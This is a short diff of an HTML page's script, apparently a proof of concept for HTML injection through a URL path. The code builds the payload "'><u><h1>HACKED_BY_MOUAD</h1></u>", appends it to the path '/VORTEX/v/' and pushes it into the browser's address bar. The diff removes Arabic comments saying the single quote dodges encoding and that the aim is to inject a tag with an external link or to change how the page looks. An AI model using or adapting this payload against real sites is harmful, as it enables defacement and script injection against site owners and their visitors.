@@ -14,11 +14,10 @@
     </a>
 
     <script>
-        // بايلود يستخدم ' (single quote) بدلاً من " لتجنب التشفير في بعض المتصفحات
-        // الهدف: حقن وسم <img> يحمل رابط خارجي أو يغير شكل الصفحة
+       
         var payload = "'><u><h1>HACKED_BY_MOUAD</h1></u>";
         
-        // بناء المسار بحيث يكون البايلود في الجزء الثالث
+        
         var attackPath = "/VORTEX/v/" + payload;
 
         window.history.pushState({}, '', attackPath);
